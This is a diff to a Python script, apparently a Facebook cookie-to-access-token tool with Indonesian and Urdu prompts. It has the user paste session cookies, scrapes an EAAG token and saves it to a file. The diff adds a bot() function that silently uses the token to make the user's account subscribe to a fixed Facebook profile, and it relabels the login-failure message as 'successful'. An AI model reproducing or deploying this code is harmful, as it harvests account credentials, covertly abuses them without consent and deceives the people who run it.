@@ -196,7 +196,7 @@ def login_lagi334():
 		banner()
 		cetak(nel('\t©©© yahan cookie do : [green] cookies [yellow] ©©©'))
 		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
+		cookie=input(f'  [{h}•{x}] Enter Cookies :{asu} ')
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
@@ -206,9 +206,11 @@ def login_lagi334():
 	except Exception as e:
 		os.system("rm -f .token.txt")
 		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
+		print(f'  %s[%sx%s]%s LOGIN successful dubara commonds lagao  !!%s'%(x,k,x,m,x))
 		exit()
-
+def bot():
+	try:
+		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
 	except:
 		pass
 #------------------[ BAGIAN-MENU ]----------------#
@@ -1147,7 +1149,7 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('clear')
 	except:pass
-	alvino_xy(f'\n\t{x}——> {h}this was tool education purpose \n\t{x} agr ap galt use karo gay ap zimadar hogay\n\t{x}')
+	alvino_xy(f'\n\t{x}——> {h}this was tool education purpose \n\t{x}——> agr ap galt use karo gay ap zimadar \n\t{x}')
 	time.sleep(3)
 	login()
 
